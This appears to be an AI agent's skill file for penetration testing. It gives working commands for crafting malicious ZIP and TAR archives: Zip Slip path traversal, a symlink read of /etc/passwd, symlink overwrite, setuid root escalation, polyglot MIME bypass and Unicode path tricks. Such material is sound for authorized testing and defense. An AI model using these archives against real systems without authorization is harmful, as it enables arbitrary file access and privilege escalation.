---
name: archive-path-traversal
description: Craft malicious archives (ZIP/TAR) to test extraction vulnerabilities including Zip Slip, symlink attacks, hardlink collisions, setuid escalation, polyglot bypasses, and Unicode path confusion. Use when a target accepts archive uploads or extracts archives server-side. Triggers on "archive upload", "zip slip", "tar extraction", "symlink", "hardlink", "polyglot", "archive alchemist", "extraction vulnerability".
---

# Archive Path Traversal & Extraction Vulnerabilities

Use this skill when the target accepts archive uploads (ZIP, TAR, tar.gz, tar.xz, tar.bz2) or otherwise extracts archives server-side. The web-security runtime includes **archivealchemist** at `~/git/archivealchemist/archive-alchemist.py` for crafting malicious archives.

## When to Use

Use archive extraction testing when you observe:

- Upload endpoints accepting `.zip`, `.tar`, `.tar.gz`, `.tar.xz`, `.tar.bz2`
- Server-side archive extraction (file import, bulk upload, theme/plugin import)
- Features that restore/back up data from archives
- Any flow where archive entries become files on disk

## Tool Reference

Tool path: `python3 ~/git/archivealchemist/archive-alchemist.py <archive> <command> [options]`

### Commands

| Command | Purpose |
|---|---|
| `add` | Add files, symlinks, hardlinks, directories |
| `replace` | Replace entries or sync from a directory |
| `append` | Append content to an existing entry |
| `modify` | Change mode, uid, gid, mtime, convert to symlink/hardlink |
| `remove` / `rm` | Remove entries |
| `list` / `ls` | List archive contents |
| `extract` | Extract safely by default; `--vulnerable` for unsafe extraction |
| `read` / `cat` | Read a specific entry |
| `polyglot` | Prepend magic bytes to an archive |

### Common Attack Patterns

#### Zip Slip (path traversal)

```bash
python3 ~/git/archivealchemist/archive-alchemist.py zipslip.zip add "../../../tmp/evil.txt" --content "pwned"
```

#### Symlink file read

```bash
python3 ~/git/archivealchemist/archive-alchemist.py symlink.tar -t tar add .bashrc --symlink "/etc/passwd"
```

#### Symlink collision (write through symlink)

```bash
python3 ~/git/archivealchemist/archive-alchemist.py collision.tar -t tar add config.txt --symlink "/tmp/target.txt"
python3 ~/git/archivealchemist/archive-alchemist.py collision.tar -t tar add config.txt --content "overwrite"
```

#### Setuid escalation

```bash
python3 ~/git/archivealchemist/archive-alchemist.py setuid.tar -t tar add exploit --content "#!/bin/sh\nwhoami" --mode 0755 --setuid --uid 0
```

#### Polyglot MIME bypass

```bash
python3 ~/git/archivealchemist/archive-alchemist.py polyglot.gif add payload.txt --content "hello there"
python3 ~/git/archivealchemist/archive-alchemist.py polyglot.gif polyglot --content "GIF89a"
```

#### Unicode path confusion

```bash
python3 ~/git/archivealchemist/archive-alchemist.py weird.zip add file.txt --content "hello" --unicodepath notfile.txt
```

## Iterative Working Directory Workflow

For complex archives, use a working directory and the `replace --content-directory` flow:

```bash
# 1. Extract the original archive safely
python3 ~/git/archivealchemist/archive-alchemist.py target.zip extract -o workdir/

# 2. Modify files in workdir/ or add malicious entries

# 3. Sync working directory back into a new archive
python3 ~/git/archivealchemist/archive-alchemist.py target_poc.zip replace --content-directory workdir/ ""

# 4. Test target_poc.zip against the target

# 5. Iterate
```

## Testing Procedure

1. **Identify the extraction surface**: find upload/import/restore endpoints that accept archives.
2. **Fingerprint the extractor**: upload a benign archive and observe where files land, what filenames are preserved, whether symlinks survive, and whether permissions are honored.
3. **Start with Zip Slip**: most extractors fail to sanitize `../` sequences. Use a relative path traversal first.
4. **Test symlink/hardlink support**: if the extractor follows symlinks, escalate to reading/writing arbitrary files.
5. **Test polyglots**: if MIME type or magic-byte checks exist, prepend valid magic bytes to a ZIP archive.
6. **Test Unicode path confusion**: some extractors use the Unicode Path extra field instead of the local file header name.
7. **Check permission preservation**: if the extractor preserves permissions, setuid/setgid bits may lead to local privilege escalation.

## Constraints

- Do not test arbitrary write paths on production systems without scope confirmation.
- Prefer writing to predictable, non-destructive locations (e.g., `/tmp/` subdirectories) during initial validation.
- Some extractors strip symlinks, permissions, or traversal sequences; negative results for one pattern do not rule out others.
- Archive extraction is usually a gadget chained with other vulnerabilities (e.g., LFI, SSRF, file upload) to achieve real impact.

## Prerequisites

- `~/git/archivealchemist/archive-alchemist.py` must exist (installed by the runtime).
- Target must accept and extract archives.
